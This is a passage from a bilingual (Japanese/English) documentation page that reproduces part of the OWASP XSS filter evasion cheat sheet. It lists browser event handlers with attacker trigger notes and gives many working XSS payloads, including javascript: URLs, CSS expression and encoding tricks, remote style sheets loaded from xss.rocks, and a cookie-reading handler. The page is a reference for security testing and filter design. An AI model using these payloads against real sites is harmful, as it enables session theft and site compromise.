+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeUpdate()` (activates on data object before updating data in the source object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBlur()` (in the case where another popup is loaded and window looses focus)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onCellChange()` (fires when data changes in the data provider)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onClick()` (someone clicks on a form)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onContextMenu()` (user would need to right click on attack area)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onControlSelect()` (fires when the user is about to make a control selection of the object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDblClick()` (user double-clicks a form element or a link)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDrag()` (requires that the user drags an object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragEnd()` (requires that the user drags an object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragLeave()` (requires that the user drags an object off a valid location)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragEnter()` (requires that the user drags an object into a valid location)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragOver()` (requires that the user drags an object into a valid location)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDragStart()` (occurs when user starts drag operation)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onDrop()` (user drops an object (e.g. file) onto the browser window)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onEnd()` (the onEnd event fires when the timeline ends.
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onError()` (loading of a document or image causes an error)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onFilterChange()` (fires when a visual filter completes state change)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onFinish()` (attacker can create the exploit when marquee is finished looping)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onFocus()` (attacker executes the attack string when the window gets focus)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onFocusIn()` (attacker executes the attack string when window gets focus)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onFocusOut()` (attacker executes the attack string when window looses focus)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onInput()` (the text content of an element is changed through the user interface)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onKeyDown()` (user depresses a key)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onKeyPress()` (user presses or holds down a key)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onKeyUp()` (user releases a key)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onLayoutComplete()` (user would have to print or print preview)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onLoad()` (attacker executes the attack string after the window loads)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMessage()` (fire when the document received a message)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseDown()` (the attacker would need to get the user to click on an image)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseEnter()` (cursor moves over an object or area)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseOver()` (cursor moves over an object or area)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseUp()` (the attacker would need to get the user to click on an image)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMove()` (user or attacker would move the page)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMoveEnd()` (user or attacker would move the page)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onMoveStart()` (user or attacker would move the page)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onPopState()` (fires when user navigated the session history)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onPropertyChange()` (user or attacker would need to change an element property)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onReadyStateChange()` (user or attacker would need to change an element property)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRedo()` (user went forward in undo transaction history)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onReset()` (user or attacker resets a form)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onResize()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRowsEnter()` (user or attacker would need to change a row in a data source)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRowExit()` (user or attacker would need to change a row in a data source)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRowDelete()` (user or attacker would need to delete a row in a data source)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onRowInserted()` (user or attacker would need to insert a row in a data source)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onStart()` (fires at the beginning of each marquee loop)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onStop()` (user would need to press the stop button or leave the webpage)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onStorage()` (storage area changed)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onSubmit()` (requires attacker or user submits a form)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onTrackChange()` (user or attacker changes track in a playList)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onUndo()` (user went backward in undo transaction history)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### BGSOUND
+
+
+```js
+<BGSOUND SRC="javascript:alert('XSS');">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### & JavaScript includes
+
+
+```html
+<BR SIZE="&{alert('XSS')}">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### STYLE sheet
+
+
+```html
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Remote style sheet
+
+Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Remote style sheet part 2
+
+This works the same as above, but uses a `&lt;STYLE>` tag instead of a `&lt;LINK>` tag). A slight variation on this vector was used
+to hack Google Desktop. As a side note, you can remove the end `&lt;/STYLE&gt;` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Remote style sheet part 3
+
+This only works in Gecko rendering engines and works by binding an XUL file to the parent page.
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### STYLE Tags that Breaks Up JavaScript for XSS
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This XSS at times sends IE into an infinite loop of alerts
+
+
+```html
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### STYLE Attribute that Breaks Up an Expression
+
+
+```html
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Created by Roman Ivanov)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### IMG STYLE with Expressions
+
+This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### STYLE Tag using Background-image
+
+
+```html
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### STYLE Tag using Background
+
+
+```html
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Anonymous HTML with STYLE Attribute
+
+The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<XSS STYLE="xss:expression(alert('XSS'))">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Local htc File
+
+This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<XSS STYLE="behavior: url(xss.htc);">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### US-ASCII Encoding
+
+This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+¼script¾alert(¢XSS¢)¼/script¾
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### META
+
+The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### META using Data
+
+Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### META with Additional URL Parameter
+
+If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade this filter rule with the following technique:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by Moritz Naumann)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### IFRAME
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### If iFrames are allowed there are a lot of other XSS problems as well
+
+
+```html
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### IFRAME Event Based
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### IFrames and most other elements can use event based mayhem like the following
+
+
+```html
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by: David Cross)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### FRAME
+
+Frames have the same sorts of XSS problems as iFrames
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### TABLE
+
+
+```html
+<TABLE BACKGROUND="javascript:alert('XSS')">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### TD
+
+Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### DIV
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### DIV Background-image
+
+
+```html
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### DIV Background-image with Unicode XSS Exploit
